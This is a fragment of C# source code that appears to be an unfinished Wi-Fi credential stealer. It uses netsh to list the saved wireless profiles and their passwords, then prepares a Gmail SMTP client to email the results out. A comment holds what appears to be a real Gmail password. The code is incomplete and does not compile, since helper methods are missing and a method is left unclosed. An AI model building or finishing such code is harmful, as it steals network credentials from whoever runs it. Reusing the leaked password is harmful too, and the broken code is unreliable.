using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace WifiPassword
{
    public class WifiPasswordHelper
    {
        public List<WifiInfo> GetWifiInfo()
        {
            string[] profiles = GetProfiles();
            string[] passwords = GetWifiPasswords(profiles);

            var result = new List<WifiInfo>();
            for (int i = 0; i < profiles.Length; i++)
            {
                result.Add(new WifiInfo
                {
                    Name = profiles[i],
                    Password = passwords[i],
                });
            }

            return result;
        }
        
        private static string[] GetProfiles()
        {
            var output = RunCommand("netsh", "wlan show profiles"); //method to be created
            var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            var result = lines.Where(line => line.Contains(" : ")).Select(x => x.Substring(x.IndexOf(":") + 2)).ToArray();
            return result;
        }
        
           public void SendWifiInfoAsEmail(List<WifiInfo> wifiInfo)
        {
            var smtpClient = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,

                DeliveryMethod = SmtpDeliveryMethod.Network,
                                UseDefaultCredentials = false,
                EnableSsl = true,
                Credentials = new NetworkCredential("sender-email", "sender-app-pass")//passi i gmail: EclipseNight2003!
            };
               

    }
}
